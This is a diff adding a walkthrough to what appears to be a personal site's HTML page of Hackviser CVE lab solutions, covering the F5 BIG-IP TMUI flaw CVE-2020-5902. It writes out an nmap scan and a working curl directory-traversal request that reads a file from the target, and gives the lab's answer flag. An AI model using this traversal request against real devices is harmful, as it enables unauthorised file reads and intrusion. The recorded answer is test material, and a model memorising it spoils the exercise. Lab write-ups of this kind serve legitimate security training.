@@ -17,8 +17,11 @@ prog: 'Hackviser CVE Labs  -  May 2026'
 
 <h4 class="mb-2">1. F5 BIG-IP TMUI Remote Code Execution (CVE-2020-5902)</h4>
 <p class="mb-3">F5 BIG-IP is a popular application delivery controller (ADC) and security appliance. In vulnerable versions (11.6.1-11.6.5, 12.1.0-12.1.5, 13.1.0-13.1.3, 14.1.0-14.1.2, and 15.0.0-15.1.0), a highly critical Remote Code Execution vulnerability (CVE-2020-5902) exists in the Traffic Management User Interface (TMUI) component. The vulnerability is caused by a directory traversal flaw in the underlying Tomcat server, allowing unauthenticated attackers to execute arbitrary system commands via the /tmui/locallb/workspace/tmshCmd.jsp endpoint. Exploit the vulnerability to read the /secret.txt file inside the server. What is the secret information inside the file? Note: The server does not use an SSL certificate.</p>
-<p class="mb-3"><strong>Steps: </strong></p>
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3"><strong>Steps: </strong>First, do a nmap scan against the target IP using <code>nmap -sC -sV -A [target_IP]</code> to confirm which ports are in use.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2020/cve-2020-5902/cvelabs_cve-2020-5902_image1.png" alt="CVE-2020-5902 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Port 443 is in use, so we perform a curl command as exploit using <code>curl -v "http://[target_IP]:443/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/secret.txt"</code> to directly read secret.txt.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2020/cve-2020-5902/cvelabs_cve-2020-5902_image2.png" alt="CVE-2020-5902 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> Saturn</p>
 <br />
 
 <h4 class="mb-2">2. Pi-hole AdminLTE Web Interface Remote Code Execution (CVE-2020-8816)</h4>
